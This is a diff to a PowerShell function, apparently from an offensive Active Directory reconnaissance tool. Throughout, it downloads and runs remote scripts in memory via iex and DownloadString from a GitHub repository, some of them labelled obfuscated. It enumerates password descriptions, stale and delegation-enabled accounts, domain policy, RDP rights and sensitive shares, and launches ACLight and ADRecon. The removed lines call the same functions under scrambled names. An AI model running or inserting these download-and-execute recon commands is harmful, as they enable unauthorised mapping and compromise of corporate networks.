@@ -509,27 +509,27 @@ function domainreconmodules
 	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
             thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"
 
-	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdev.ps1')
-	        $Date = (Get-Date).AddYears(-1).ToFileTime()
-            noshes -RmrzVOkRggEzAyC "(pwdlastset<=$Date)" -wDpWXLYTGZrAWN9 samaccountname,pwdlastset >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"
+	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/Pviewdev.ps1')
+	    $Date = (Get-Date).AddYears(-1).ToFileTime()
+            Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"
 	        
-	        noshes -RmrzVOkRggEzAyC "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -wDpWXLYTGZrAWN9 distinguishedname
-            noshes -UACFilter NOT_ACCOUNTDISABLE -wDpWXLYTGZrAWN9 distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
+	    Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
+            Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
 	        
-	        $Computers = eigenvalues -Ku9ZmWgd9fLSPTw >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
-            $Users = noshes -ppACfvFXyx9fpzx -SkNLjyYBJxqKTQ9 >> "$currentPath\DomainRecon\UnconstrainedDelegationUsers.txt"
+	    $Computers = Get-DomainComputer -Unconstrained >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
+            $Users = Get-DomainUser -AllowDelegation -AdminCount >> "$currentPath\DomainRecon\AllowDelegationUsers.txt"
 	        
-	        $DomainPolicy = ablaze -Tj9sqOWMRhlsjX9 Domain
+	    $DomainPolicy = Get-DomainPolicy -Policy Domain
             $DomainPolicy.KerberosPolicy >> "$currentPath\DomainRecon\Kerberospolicy.txt"
             $DomainPolicy.SystemAccess >> "$currentPath\DomainRecon\Passwordpolicy.txt"
 	        
-	        bustling -WPxsp9KIBMFyVPQ -n9gorCgPlTjDyXn RDP >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
+	    Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity   >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
 	        
-	        $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain shares - can take a while? (yes/no)'
+	    $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain share files - can take a while? (yes/no)'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
-	        	replaced >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
-	        }
+	        	Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
+	    }
             
             $aclight = Read-Host -Prompt 'Starting ACLAnalysis for Shadow Admin detection? (yes/no)'
             if ($aclight -eq "yes" -or $aclight -eq "y" -or $aclight -eq "Yes" -or $aclight -eq "Y")
@@ -537,7 +537,7 @@ function domainreconmodules
 	    	    Write-Host -ForegroundColor Yellow 'Starting ACLAnalysis for Shadow Admin detection:'
                 invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'
 
-	        }
+	    }
             
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
             Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
